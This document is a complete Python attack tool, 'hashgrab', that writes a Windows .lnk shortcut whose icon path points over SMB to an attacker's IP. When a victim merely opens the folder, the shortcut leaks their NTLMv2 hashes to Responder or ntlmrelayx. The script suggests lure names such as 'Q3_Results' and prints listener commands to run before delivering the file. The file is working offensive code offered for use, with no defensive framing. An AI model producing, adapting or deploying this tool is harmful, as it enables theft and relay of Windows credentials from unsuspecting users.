#!/usr/bin/env python3
"""hashgrab - generate a .lnk file that captures NTLMv2 hashes via UNC path.

When a Windows host browses a folder containing the generated .lnk file,
Explorer automatically attempts to resolve the icon over SMB, sending
NTLMv2 credentials to the attacker's listener (Responder, ntlmrelayx, etc.)
without any user interaction beyond opening the folder.

Requirements:
    Responder or ntlmrelayx listening on the attacker IP.

Usage:
    hashgrab <attacker-ip> <output-name>

    <attacker-ip>   IP address of the machine running your SMB listener
    <output-name>   filename prefix — the .lnk extension is appended automatically

Examples:
    hashgrab 10.10.14.5 important_report
    hashgrab 192.168.1.10 Q3_Results
"""

import argparse
import os
import struct
import sys


# ---------------------------------------------------------------------------
# ANSI colours
# ---------------------------------------------------------------------------
RED    = '\033[0;31m'
GREEN  = '\033[0;32m'
BLUE   = '\033[0;34m'
RESET  = '\033[0m'


def err(msg: str = "") -> None:
    print(msg, file=sys.stderr)


# ---------------------------------------------------------------------------
# LNK builder
# ---------------------------------------------------------------------------
def build_lnk(attacker_ip: str) -> bytes:
    """Return the raw bytes of a minimal .lnk file whose icon location points
    to a UNC path on attacker_ip.  Built from scratch per [MS-SHLLINK] so
    there are no template size constraints.

    Binary layout:
        ShellLinkHeader  (76 bytes, fixed)
        StringData       (2-byte char count + UTF-16LE icon path, no IDList/LinkInfo)
    """

    # LinkFlags
    HasIconLocation = 0x00000040   # bit 6  — ICON_LOCATION StringData is present
    IsUnicode       = 0x00000080   # bit 7  — StringData is UTF-16LE
    ForceNoLinkInfo = 0x00000100   # bit 8  — suppress "target not found" errors
    link_flags = HasIconLocation | IsUnicode | ForceNoLinkInfo  # 0x1C0

    # CLSID: 00021401-0000-0000-C000-000000000046
    clsid = bytes([
        0x01, 0x14, 0x02, 0x00,
        0x00, 0x00,
        0x00, 0x00,
        0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46,
    ])

    # ShellLinkHeader — must be exactly 76 bytes
    header  = struct.pack('<I', 0x0000004C)        # HeaderSize = 76
    header += clsid                                 # LinkCLSID  (16 bytes)
    header += struct.pack('<I', link_flags)         # LinkFlags
    header += struct.pack('<I', 0x00000020)         # FileAttributes = FILE_ATTRIBUTE_ARCHIVE
    header += struct.pack('<Q', 0)                  # CreationTime
    header += struct.pack('<Q', 0)                  # AccessTime
    header += struct.pack('<Q', 0)                  # WriteTime
    header += struct.pack('<I', 0)                  # FileSize
    header += struct.pack('<I', 0)                  # IconIndex
    header += struct.pack('<I', 0x00000001)         # ShowCommand = SW_SHOWNORMAL
    header += struct.pack('<H', 0)                  # HotKey
    header += struct.pack('<H', 0)                  # Reserved1
    header += struct.pack('<I', 0)                  # Reserved2
    header += struct.pack('<I', 0)                  # Reserved3

    assert len(header) == 76, f"Header is {len(header)} bytes, expected 76"

    # StringData — ICON_LOCATION
    # UNC path: \\<ip>\share\icon.ico  (share/filename are arbitrary)
    unc_path = f'\\\\{attacker_ip}\\share\\icon.ico'
    encoded = unc_path.encode('utf-16-le')
    icon_location = struct.pack('<H', len(unc_path)) + encoded

    return header + icon_location


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main() -> None:
    parser = argparse.ArgumentParser(
        prog="hashgrab",
        description="Generate a .lnk file that captures NTLMv2 hashes via UNC path.",
        epilog="Run Responder or ntlmrelayx on <attacker-ip> before delivering the file.",
    )
    parser.add_argument("ip",      help="Attacker IP address (SMB listener)")
    parser.add_argument("name",    help="Output filename prefix (.lnk is appended)")
    args = parser.parse_args()

    output = args.name if args.name.endswith(".lnk") else args.name + ".lnk"

    if os.path.exists(output):
        err(f"{RED}[!] File already exists: {output}{RESET}")
        sys.exit(1)

    lnk_bytes = build_lnk(args.ip)

    with open(output, "wb") as f:
        f.write(lnk_bytes)

    unc = f'\\\\{args.ip}\\share\\icon.ico'
    err(f"{GREEN}[+] Created:    {output}{RESET}")
    err(f"{BLUE}[*] UNC path:   {unc}{RESET}")
    err(f"{BLUE}[*] Size:       {len(lnk_bytes)} bytes{RESET}")
    err("")
    err(f"{BLUE}[*] Start your listener:{RESET}")
    err(f"    sudo responder -I <interface>")
    err(f"    sudo ntlmrelayx.py -t smb://<target>")


if __name__ == "__main__":
    main()
